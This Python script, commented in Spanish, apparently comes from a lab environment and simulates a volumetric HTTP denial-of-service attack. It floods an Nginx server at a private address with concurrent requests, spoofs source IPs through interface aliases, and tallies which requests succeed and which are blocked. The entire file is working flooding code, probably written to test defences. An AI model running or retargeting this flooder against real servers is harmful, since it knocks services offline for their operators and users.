#!/usr/bin/env python3
"""
Simulador de Ataque DoS Volumétrico HTTP
Genera ráfagas de peticiones concurrentes para saturar el servidor Nginx (172.20.0.10)
Permite especificar la IP de origen mediante --ip para simular orígenes desconocidos.
"""

import time
import argparse
import subprocess
import requests
import concurrent.futures
from requests.adapters import HTTPAdapter

TARGET_URL = "http://172.20.0.10/"

class SourceAddressAdapter(HTTPAdapter):
    def __init__(self, source_ip, **kwargs):
        self.source_ip = source_ip
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs['source_address'] = (self.source_ip, 0)
        return super().init_poolmanager(*args, **kwargs)

def ensure_ip_alias(ip):
    try:
        subprocess.run(["ip", "addr", "add", f"{ip}/24", "dev", "eth0"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def send_request(session, req_id, source_ip):
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; AttackBot/1.0; +http://malicious.org/bot)"
    }
    try:
        start = time.time()
        res = session.get(TARGET_URL, headers=headers, timeout=2.0)
        elapsed = round((time.time() - start) * 1000, 2)
        return (req_id, res.status_code, elapsed)
    except requests.exceptions.RequestException:
        return (req_id, "BLOCKED / TIMEOUT", None)

def main():
    parser = argparse.ArgumentParser(description="Simulador de Ataque DoS Volumétrico")
    parser.add_argument("--ip", default="172.20.0.88", help="Dirección IP de origen del atacante (default: 172.20.0.88)")
    parser.add_argument("--requests", type=int, default=260, help="Cantidad de peticiones (default: 150)")
    parser.add_argument("--concurrency", type=int, default=10, help="Concurrencia en hilos (default: 10)")
    args = parser.parse_args()

    source_ip = args.ip
    if source_ip in ["172.20.0.10", "172.20.0.1"]:
        print(f"[!] Error: {source_ip} es la IP del servidor víctima o gateway.")
        print("    No se puede usar como IP de origen del atacante. Use una IP de cliente (ej: 172.20.0.88, 172.20.0.77, 172.20.0.120).")
        return

    ensure_ip_alias(source_ip)

    session = requests.Session()
    try:
        adapter = SourceAddressAdapter(source_ip, pool_maxsize=args.concurrency)
        session.mount("http://", adapter)
    except Exception as e:
        print(f"[!] No se pudo enlazar a {source_ip}, usando socket por defecto: {e}")

    print("=" * 60)
    print(f"🚨 INICIANDO ATAQUE DoS VOLUMÉTRICO CONTRA {TARGET_URL}")
    print(f"🎯 IP Atacante (Origen): {source_ip}")
    print(f"📦 Cantidad de peticiones: {args.requests} | Concurrencia: {args.concurrency}")
    print("=" * 60)

    start_time = time.time()
    success_count = 0
    blocked_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        futures = [executor.submit(send_request, session, i, source_ip) for i in range(1, args.requests + 1)]
        for future in concurrent.futures.as_completed(futures):
            req_id, status, elapsed = future.result()
            if status == 200:
                success_count += 1
                if req_id % 20 == 0:
                    print(f"  [+] Req #{req_id:03d} desde {source_ip}: 200 OK ({elapsed}ms)")
            else:
                blocked_count += 1
                if req_id % 20 == 0 or blocked_count <= 5:
                    print(f"  [!] Req #{req_id:03d} desde {source_ip}: {status}")

    total_time = round(time.time() - start_time, 2)
    print("=" * 60)
    print(f"⏱️ Ataque desde {source_ip} finalizado en {total_time} segundos.")
    print(f"📊 Exitosas (200 OK): {success_count} | Bloqueadas/Fallidas: {blocked_count}")
    print("=" * 60)

if __name__ == "__main__":
    main()
